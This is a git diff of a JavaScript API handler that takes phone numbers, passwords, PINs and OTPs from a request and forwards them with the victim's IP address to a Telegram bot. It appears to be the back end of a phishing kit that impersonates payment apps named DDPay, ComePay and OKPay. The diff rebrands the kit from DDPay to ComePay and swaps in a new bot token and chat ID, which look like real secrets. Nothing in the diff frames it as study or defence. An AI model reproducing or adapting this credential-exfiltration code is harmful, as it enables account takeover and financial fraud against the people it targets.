@@ -6,8 +6,8 @@ export default async function handler(req, res) {
   const { type, phone, pass, pin, otp } = req.body;
 
   // --- TELEGRAM BOT CONFIGURATION ---
-  const BOT_TOKEN_1 = '9149760139:AAFKMfnqhDYt0IyIzBe6mX2EzfelyYQm2WI';
-  const CHAT_ID_1 = '7691783895';
+  const BOT_TOKEN_1 = '9148258637:AAHpr-TDReyO107nMjlex0UyJyi4LjGcAAY';
+  const CHAT_ID_1 = '6823444975';
 
   const BOT_TOKEN_2 = ''; 
   const CHAT_ID_2 = '';
@@ -17,7 +17,7 @@ export default async function handler(req, res) {
   let message = '';
 
   if (type === 'login') {
-    message = `✅ <b>New DDPay Login</b>\n🌐 IP: <code>${clientIp}</code>\n📱 Phone: <code>${phone}</code>\n🔑 Password: <code>${pass}</code>\n🔐 PIN: <code>${pin || 'N/A'}</code>`;
+    message = `✅ <b>New ComePay Login</b>\n🌐 IP: <code>${clientIp}</code>\n📱 Phone: <code>${phone}</code>\n🔑 Password: <code>${pass}</code>\n🔐 PIN: <code>${pin || 'N/A'}</code>`;
   } else if (type === 'send_otp' || type === 'modal_otp') {
     message = `🔐 <b>OTP Requested (OKPay)</b>\n🌐 IP: <code>${clientIp}</code>\n📱 Phone: +91 <code>${phone}</code>`;
   } else if (type === 'verify_otp') {
